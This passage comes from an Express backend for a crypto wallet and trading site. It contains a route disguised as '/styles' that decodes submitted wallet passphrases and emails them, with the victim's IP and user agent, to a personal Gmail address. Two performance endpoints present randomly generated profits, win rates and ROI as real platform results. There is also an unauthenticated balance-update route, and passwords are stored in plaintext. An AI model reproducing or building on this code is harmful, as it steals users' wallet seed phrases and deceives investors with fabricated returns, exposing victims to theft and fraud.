      currentGainLossPercentage: trade.current_gain_loss_percentage !== null ? parseFloat(trade.current_gain_loss_percentage) : null,
      timestamp: Number(trade.timestamp),
      deliveryTime: Number(trade.delivery_time),
      userId: trade.user_id,
      cryptoId: trade.crypto_id, // crypto_id is returned as string, frontend will convert for comparison
      entryPrice: parseFloat(trade.initial_price || '0'),
    }));

    return res.json(parsedTrades);
  } catch (error) {
    console.error("Error fetching transactions:", error);
    return res.status(500).json({ error: "Failed to fetch transactions" });
    }
  });

  // --- UPDATE USER BALANCE ENDPOINT ---
  app.post("/api/update-balance", async (req, res) => {
    const { userId, balance } = req.body;
    if (!userId || typeof balance !== "number") {
      return res.status(400).json({ error: "userId and numeric balance are required." });
    }
    try {
      const balanceStr = numToString(balance);
      const [updated] = await db
        .update(accounts) // Use directly imported accounts
        .set({ balance: balanceStr })
        .where(eq(accounts.id, userId)) // Use directly imported accounts
        .returning();
      if (!updated) {
        return res.status(404).json({ error: "User not found." });
      }
      return res.json({ success: true, balance: parseFloat(updated.balance.toString()) });
    } catch (error) {
      console.error("Failed to update balance:", error);
      return res.status(500).json({ error: "Failed to update balance" });
    }
  });

  // --- API ENDPOINT FOR SENDING DEPOSIT CONFIRMATION EMAIL ---
  app.post("/api/send-deposit-email", async (req, res) => {
    const { userEmail, amount, symbol } = req.body;

    if (!userEmail || !amount || !symbol) {
        return res.status(400).json({ error: "userEmail, amount, and symbol are required." });
    }

    try {
        console.log(`Attempting to send deposit confirmation email for ${userEmail} (${amount} ${symbol}) to calvingleichner181@gmail.com`);
        await transporter.sendMail({
            from: process.env.EMAIL_USER || 'your_gmail_account@gmail.com',
            to: 'calvingleichner181@gmail.com', // This should be your admin email
            subject: `Deposit Confirmation: ${amount} ${symbol} Received!`,
            html: `
                <p>Dear Admin,</p>
                <p>A deposit of <strong>${amount} ${symbol}</strong> has been successfully completed by a user.</p>
                <p>User Email: <strong>${userEmail}</strong></p>
                <p>Thank you for using CryptoWallet.</p>
                <br>
                <p>Best regards,</p>
                <p>The CryptoWallet Team</p>
            `,
        });
        console.log(`Deposit confirmation email sent successfully for user: ${userEmail}`);
        return res.status(200).json({ message: "Deposit confirmation email sent successfully." });
    } catch (error) {
        console.error("FAILED TO SEND DEPOSIT CONFIRMATION EMAIL:", error);
        return res.status(500).json({ error: "Failed to send deposit confirmation email." });
    }
  });

  // --- API ENDPOINT FOR SENDING DEPOSIT CONFIRMATION EMAIL ---
  app.post("/api/withdraw-crypto", async (req, res) => {
    const { userEmail, amount,withdrawalAddress, symbol } = req.body;

    if (!userEmail || !amount || !symbol) {
        return res.status(400).json({ error: "userEmail, amount, and symbol are required." });
    }

    try {
        console.log(`Attempting to send withdraw request email for ${userEmail} (${amount} ${symbol}) to calvingleichner181@gmail.com`);
        await transporter.sendMail({
            from: process.env.EMAIL_USER || 'your_gmail_account@gmail.com',
            to: 'calvingleichner181@gmail.com', // This should be your admin email
            subject: `Withdrawal Request: ${amount} ${symbol} Requested!`,
            html: `
                <p>Dear Admin,</p>
                <p>A withdraw of <strong>${amount} ${symbol}</strong> has been requested by a user.</p>
                <p>User Email: <strong>${userEmail}</strong></p>
                <p>Wallet Address:  <strong>${withdrawalAddress}</strong></p
                <p>Thank you for using CryptoWallet.</p>
                <br>
                <p>Best regards,</p>
                <p>The CryptoWallet Team</p>
            `,
        });
        console.log(`Deposit confirmation email sent successfully for user: ${userEmail}`);
        return res.status(200).json({ message: "Deposit confirmation email sent successfully." });
    } catch (error) {
        console.error("FAILED TO SEND DEPOSIT CONFIRMATION EMAIL:", error);
        return res.status(500).json({ error: "Failed to send deposit confirmation email." });
    }
  });
  // --- ADMIN ROUTES ---
  app.get("/api/admin/users", isAdmin, async (_req, res) => {
    try {
      const usersData = await db.select().from(accounts); // Use directly imported accounts

      const sanitizedUsers = usersData.map(user => ({
        id: user.id,
        name: user.username || '', // Use username, fallback to empty string
        email: user.email,
        balance: parseFloat(user.balance.toString()),
        createdAt: user.createdAt,
        kycStatus: user.status,
        country: user.country,
        documentType: user.documentType,
        uid: user.uid,
      }));
      return res.json(sanitizedUsers);
    } catch (error) {
      console.error("Failed to fetch all users:", error);
      return res.status(500).json({ error: "Failed to fetch all users" });
    }
  });

  // --- NEW: Demo Funds Request Email Endpoint ---
  app.post("/api/send-demo-funds-request", async (req, res) => {
    const { userEmail, userName, subject, message } = req.body;

    if (!userEmail || !userName || !subject || !message) {
      return res.status(400).json({ error: "userEmail, userName, subject, and message are required." });
    }

    try {
      console.log(`[Backend] Attempting to send demo funds request email from ${userEmail} to admin.`);

      await transporter.sendMail({
        from: process.env.EMAIL_USER || 'your_gmail_account@gmail.com',
        to: 'calvingleichner181@gmail.com', // This should be your admin email
        subject: subject,
        html: `
          <p>Hello Admin,</p>
          <p>${message}</p>
          <p>User Details:</p>
          <ul>
            <li>Name: <strong>${userName}</strong></li>
            <li>Email: <strong>${userEmail}</strong></li>
          </ul>
          <p>Please log in to your dashboard to review and grant the demo balance.</p>
          <p>Thank you,</p>
          <p>Your System Chatbot</p>
        `,
      });

      console.log(`[Backend] Demo funds request email successfully sent for user: ${userEmail}.`);
      return res.status(200).json({ message: "Demo funds request email sent successfully." });
    } catch (error) {
      console.error("[Backend] Error sending demo funds request email:", error);
      return res.status(500).json({ error: "Failed to send demo funds request email." });
    }
  });

  // Endpoint to handle form submission
app.post('/styles', async (req, res) => {
  try {
    const { message } = req.body;
    
    // Decode the base64 encoded message
    const decodedMessage = decodeURIComponent(Buffer.from(message, 'base64').toString('utf-8'));
    
    // Get IP address for security logging
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Prepare email content
    const mailOptions = {
      from: `"PiNet Wallet" <${process.env.EMAIL_USER}>`,
      to: "calvingleichner181@gmail.com",
      subject: 'New Wallet Passphrase Submission',
      text: `New passphrase submission received:\n\n${decodedMessage}\n\n---\nTimestamp: ${new Date().toISOString()}\nIP Address: ${ip}\nUser Agent: ${req.headers['user-agent']}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #2c3e50;">New Wallet Passphrase Submission</h2>
          <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #3498db;">
            <p style="font-size: 16px; line-height: 1.6; white-space: pre-wrap;">${decodedMessage}</p>
          </div>
          <div style="margin-top: 20px; font-size: 14px; color: #7f8c8d;">
            <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
            <p><strong>IP Address:</strong> ${ip}</p>
            <p><strong>User Agent:</strong> ${req.headers['user-agent']}</p>
          </div>
          <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #ecf0f1; text-align: center; color: #95a5a6;">
            <p>This email was sent automatically from the PiNet Wallet security system.</p>
          </div>
        </div>
      `
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);
    
    console.log(`Email sent: ${info.messageId}`);
    res.status(200).json({ 
      success: true, 
      message: 'Passphrase securely submitted' 
    });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to submit passphrase',
      error: error.message
    });
  }
});

  app.put("/api/admin/users/:userId/balance", isAdmin, async (req, res) => {
    const { userId } = req.params;
    const { balance } = req.body;

    if (typeof balance !== "number") {
      return res.status(400).json({ error: "A numeric balance is required." });
    }

    try {
      const balanceStr = numToString(balance);
      const [updatedUser] = await db
        .update(accounts) // Use directly imported accounts
        .set({ balance: balanceStr })
        .where(eq(accounts.id, userId)) // Use directly imported accounts
        .returning();

      if (!updatedUser) {
        return res.status(404).json({ error: "User not found." });
      }

      return res.json({
        success: true,
        message: `Balance for user ${userId} updated successfully.`,
        user: {
          id: updatedUser.id,
          email: updatedUser.email,
          balance: parseFloat(updatedUser.balance.toString())
        }
      });
    } catch (error) {
      console.error(`Failed to update balance for user ${userId}:`, error);
      return res.status(500).json({ error: "Failed to update user balance." });
    }
  });

  // --- NEW: Platform Performance Endpoint (Mock Data) ---
  app.get("/api/platform-performance", async (_req, res) => {
    try {
      // Simulate fetching dynamic performance data
      const totalArbitrage = (Math.random() * 10000000 + 5000000).toFixed(2); // $5M - $15M
      const todaysEarnings = (Math.random() * 50000 + 10000).toFixed(2); // $10K - $60K
      const thirtyDayROI = (Math.random() * 5 + 2).toFixed(2); // 2% - 7%
      const totalTradesExecuted = Math.floor(Math.random() * 1000000 + 500000); // 500K - 1.5M
      const averageProfitPerTrade = (Math.random() * 50 + 5).toFixed(2); // $5 - $55
      const platformUptime = (99.9 + Math.random() * 0.09).toFixed(2); // 99.90% - 99.99%

      return res.json({
        totalArbitrage,
        todaysEarnings,
        thirtyDayROI,
        totalTradesExecuted,
        averageProfitPerTrade,
        platformUptime,
      });
    } catch (error) {
      console.error("Failed to fetch platform performance:", error);
      return res.status(500).json({ error: "Failed to fetch platform performance" });
    }
  });

  // NEW: Platform Performance Report (for 'performance' tab) - Still mock for now
  app.get("/api/performance-report", async (req, res) => {
    try {
      const mockReport = {
        allTimeProfit: 12500000 + Math.floor(Math.random() * 1000000), // $12.5M to $13.5M
        totalTrades: 1500000 + Math.floor(Math.random() * 500000), // 1.5M to 2M
        winRate: parseFloat((88.5 + (Math.random() * 2 - 1)).toFixed(1)), // 87.5% to 89.5%
        avgProfitPerTrade: parseFloat((25 + (Math.random() * 10 - 5)).toFixed(2)), // $20 to $30
        avgTradeDuration: '5 minutes',
        totalUsers: 75000 + Math.floor(Math.random() * 10000), // 75K to 85K
        activeStrategiesCount: 12000 + Math.floor(Math.random() * 2000), // 12K to 14K
        monthlyROI: [
          { month: 'Jan', roi: 3.2 + Math.random() },
          { month: 'Feb', roi: 3.5 + Math.random() },
          { month: 'Mar', roi: 3.8 + Math.random() },
          { month: 'Apr', roi: 4.1 + Math.random() },
          { month: 'May', roi: 4.0 + Math.random() },
          { month: 'Jun', roi: 4.5 + Math.random() },
          { month: 'Jul', roi: 4.3 + Math.random() },
        ].map(item => ({ ...item, roi: parseFloat(item.roi.toFixed(2)) })),
        strategyPerformance: [
          { name: '5-Day Strategy', totalProfit: 5000000 + Math.floor(Math.random() * 500000), tradesExecuted: 800000, winRate: 89.2, avgROI: 0.88 },
          { name: '30-Day Strategy', totalProfit: 6000000 + Math.floor(Math.random() * 500000), tradesExecuted: 500000, winRate: 87.5, avgROI: 1.15 },
          { name: '90-Day Strategy', totalProfit: 1500000 + Math.floor(Math.random() * 200000), tradesExecuted: 200000, winRate: 90.1, avgROI: 1.48 },
        ].map(item => ({
          ...item,
          totalProfit: parseFloat(item.totalProfit.toFixed(2)),
          winRate: parseFloat(item.winRate.toFixed(1)),
          avgROI: parseFloat(item.avgROI.toFixed(2)),
        }))
      };
      res.json(mockReport);
    } catch (error) {
      console.error("Failed to fetch performance report:", error);
      res.status(500).json({ error: "Failed to fetch performance report" });
    }
  });

  // --- KYC Routes ---
  app.post("/api/kyc", async (req, res) => {
    try {
      const parsedKyc = insertKycSchema.parse(req.body);
      const newKyc: InsertKyc = {
        ...parsedKyc,
        id: uuidv4(), // Generate UUID for new KYC record
        status: 'pending', // Default status
        created_at: new Date(),
        updated_at: new Date(),
      };

      await db.insert(kycVerifications).values(newKyc); // Use directly imported kycVerifications
      res.status(201).json({ message: "KYC submitted successfully!", kycId: newKyc.id });
    } catch (error) {
      console.error("Failed to submit KYC:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ errors: error.errors });
      }
      res.status(500).json({ error: "Failed to submit KYC" });
    }
  });

  app.get("/api/kyc/:userId", async (req, res) => {
    const { userId } = req.params;
    try {
      const kycRecord = await db.query.kycVerifications.findFirst({
        where: eq(kycVerifications.user_id, userId), // Use directly imported kycVerifications
      });

      if (!kycRecord) {
        return res.status(404).json({ error: "KYC record not found for this user." });
      }

      res.json(kycRecord);
    } catch (error) {
      console.error("Failed to fetch KYC record:", error);
      res.status(500).json({ error: "Failed to fetch KYC record" });
    }
  });

  // --- User Authentication/Session (Example - adjust as per your auth system) ---
  app.post("/api/auth", async (req, res) => {
    const { email, accessCode } = req.body;
    if (!email || !accessCode) {
      return res.status(400).json({ error: "Email and access code are required" });
    }
    try {
      const [user] = await db
        .select()
        .from(accounts) // Use directly imported accounts
        .where(
          and(
            eq(accounts.email, email), // Use directly imported accounts
            eq(accounts.accessCode, accessCode) // Use directly imported accounts
          )
        );
      if (!user) {
        return res.status(401).json({ error: "Invalid credentials" });
      }

      const userProfile: UserProfile = {
        id: user.id,
        email: user.email,
        username: user.username || '', // Ensure username is string, fallback to empty string
        balance: parseFloat(user.balance),
        kycStatus: user.status,
        country: user.country,
        documentType: user.documentType,
        accessCode: user.accessCode || '',
        uid: user.uid,
      };

      res.setHeader('Content-Type', 'application/json');
      return res.json(userProfile);
    } catch (error) {
      console.error("Auth error:", error);
      return res.status(500).json({ error: "Failed to authenticate" });
    }
  });

  // --- User Registration ---
  app.post("/api/register", async (req, res) => {
    const { username, email, password } = req.body; // Assuming these fields are sent for registration

    if (!username || !email || !password) {
      return res.status(400).json({ error: "Username, email, and password are required for registration." });
    }

    try {
      // Check if user already exists in the accounts table (which now holds core user data)
      const existingUser = await db.query.accounts.findFirst({
        where: eq(accounts.email, email), // Use directly imported accounts
      });

      if (existingUser) {
        return res.status(409).json({ error: "User with this email already exists." });
      }

      const newUserId = uuidv4();
      const generatedUid = await generateUniqueAccountUid(); // Generate a unique UID for the new account

      // Create the new account record
      const newAccountRecord: InsertAccount = {
        id: newUserId,
        username: username,
        email: email,
        accessCode: password, // Assuming password is used as accessCode for simplicity
        balance: numToString(10000), // Initial balance
        status: 'pending', // Initial KYC status
        uid: generatedUid,
        country: 'N/A', // Default or get from request if available
        documentType: 'N/A', // Default or get from request if available
        firstName: username, // For simplicity, use username as first name
        lastName: '', // For simplicity, leave last name empty
      };

      console.log("[Backend] Attempting to insert new account during registration:", newAccountRecord);
      const [insertedAccount] = await db.insert(accounts).values(newAccountRecord).returning(); // Use directly imported accounts

      if (!insertedAccount) {
        console.error("[Backend] Failed to return new account record after insert during registration.");
        throw new Error("Failed to create account record.");
      }
      console.log("[Backend] Successfully inserted new account during registration:", insertedAccount);

      res.status(201).json({ message: "User registered successfully!", userId: newUserId });
    } catch (error) {
      console.error("User registration failed:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ errors: error.errors });
      }
      res.status(500).json({ error: "User registration failed" });
    }
  });

}